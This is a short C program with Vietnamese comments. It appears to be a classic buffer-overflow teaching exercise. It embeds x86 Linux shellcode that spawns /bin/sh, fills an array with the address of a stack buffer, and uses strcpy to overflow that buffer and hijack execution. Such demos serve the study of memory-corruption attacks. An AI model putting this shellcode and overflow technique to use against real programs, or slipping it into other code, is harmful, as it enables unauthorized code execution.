#include <stdio.h>
#include <stdlib.h>
#include <string.h> // Bổ sung khai báo cho strlen và strcpy

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

int main() {
    char buffer[96];
    int i;
    long *long_ptr = (long *)large_string;

    // Ghi 32 lần địa chỉ buffer vào large_string
    for (i = 0; i < 32; i++)
        *(long_ptr + i) = (long)buffer;

    // Copy shellcode vào đầu large_string
    for (i = 0; i < strlen(shellcode); i++)
        large_string[i] = shellcode[i];

    // Gây tràn buffer
    strcpy(buffer, large_string);

    return 0;
}
